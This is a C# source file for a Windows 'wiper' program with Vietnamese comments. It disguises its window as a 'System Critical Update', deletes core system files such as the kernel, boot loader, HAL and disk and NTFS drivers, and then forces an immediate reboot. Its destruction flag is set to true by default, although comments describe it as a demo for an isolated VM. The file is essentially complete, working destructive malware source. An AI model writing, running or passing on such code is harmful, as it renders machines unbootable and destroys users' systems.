using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Wiper
{
    class Program
    {
        // === CẤU HÌNH AN TOÀN ===
        // false = Chỉ in log ra màn hình (Mô phỏng).
        // true  = Xóa file thật và Reboot máy (DÙNG TRONG VM ISOLATED).
        private static bool _enableDestruction = true;

        static void Main(string[] args)
        {
            // Ngụy trang tiêu đề cửa sổ
            Console.Title = "System Critical Update";

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n==========================================");
            Console.WriteLine("!!! CRITICAL SYSTEM PROCESS STARTED !!!");
            Console.WriteLine("==========================================\n");
            Console.WriteLine("Initiating System Cleanup Sequence...");

            // Danh sách các file hệ thống quan trọng để xóa
            string[] criticalFiles = {
                @"C:\Windows\System32\ntoskrnl.exe",       // Windows Kernel
                @"C:\Windows\System32\boot\winload.exe",   // Boot Loader
                @"C:\Windows\System32\hal.dll",            // Hardware Abstraction Layer
                @"C:\Windows\System32\drivers\disk.sys",   // Disk Driver
                @"C:\Windows\System32\drivers\ntfs.sys"    // File System Driver
            };

            // Thực hiện xóa
            foreach (var file in criticalFiles)
            {
                DestroyFile(file);
            }

            Console.WriteLine("\nOperation complete.");

            // Giai đoạn cuối: Màn hình xanh (BSOD) hoặc Reboot
            if (_enableDestruction)
            {
                Console.WriteLine("Rebooting system to finalize changes...");
                // Lệnh này sẽ khởi động lại máy ngay lập tức
                Process.Start("shutdown", "/r /t 0 /f");
            }
            else
            {
                Console.WriteLine("[SIMULATION] System would reboot to BSOD now.");
                Console.WriteLine("Press Enter to exit simulation...");
                Console.ReadLine();
            }
        }

        static void DestroyFile(string filePath)
        {
            try
            {
                if (_enableDestruction)
                {
                    // Trong thực tế, malware sẽ cần chiếm quyền (Take Ownership) file trước.
                    // Ở đây dùng lệnh cơ bản để demo.
                    if (File.Exists(filePath))
                    {
                        File.SetAttributes(filePath, FileAttributes.Normal); // Gỡ bỏ thuộc tính Read-only/System
                        File.Delete(filePath);
                        Console.WriteLine($"[DELETED] {filePath}");
                    }
                    else
                    {
                        Console.WriteLine($"[NOT FOUND] {filePath}");
                    }
                }
                else
                {
                    // Chế độ mô phỏng
                    Console.WriteLine($"[SIMULATED DELETE] {filePath}");
                    Thread.Sleep(200); // Tạo độ trễ để nhìn cho nguy hiểm
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[FAILED] {filePath} - Error: {ex.Message}");
            }
        }
    }
}